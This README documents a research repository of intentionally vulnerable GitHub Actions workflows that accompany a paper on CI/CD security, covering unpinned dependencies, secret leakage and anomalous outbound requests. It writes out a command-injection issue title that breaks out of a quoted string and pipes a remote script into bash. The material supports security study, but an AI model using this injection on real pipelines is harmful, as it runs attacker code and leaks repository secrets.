# CICD SoK Evaluators

This repository hosts the GitHub Actions evaluator pipelines showcased in the SoK: "Understanding CI/CD Security: A Comprehensive Review of Architecture, Attacks, and Defenses".

## Instructions

Each of the 7 evaluators are located inside of `.github/workflows/`, with documentation comments embedded within the workflows. The `src/` folder contains artifacts and code used by the workflows during their execution, and the `CMakeLists.txt` in the root of the repository defines the library portion of the "Unpinned Dependency" evaluation (consolidated from two repositories into one, for clarity).

This repository has two commits, the initial commit containing a non-exploited copy of `src/unpinned_lib`, configured to build `src/lib_unpinned/lib_unpinned.c`, whereas the newest commit builds `src/lib_unpinned/evil_lib_unpinned.c`.

Each of these workflows can be triggered by performing a [manual workflow dispatch](https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/manually-running-a-workflow), with the exception of the simple and complex command injection workflows, which require opening an issue on the repository.

### Command Injection Workflows

For the simple and complex command injection workflows, you must craft the title of your issue to contain a bash command injection sequence, like the following:
```
RANDOM TEXT STRING" && curl -sSfL https://raw.githubusercontent.com/riversideresearch/CICD_SoK_Evaluators/main/src/injection/code.sh | bash && echo "
```

Additionally, you must define `$SUPER_DUPER_SECRET` (with any value) as a [secret/variable on GitHub](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables), in order to observe its leakage.

### Anomalous Request

In order for the anomalous request evaluator to work, you must replace `https://webhook.site/your-webhook-url-here` with a valid webhook to send a request to.
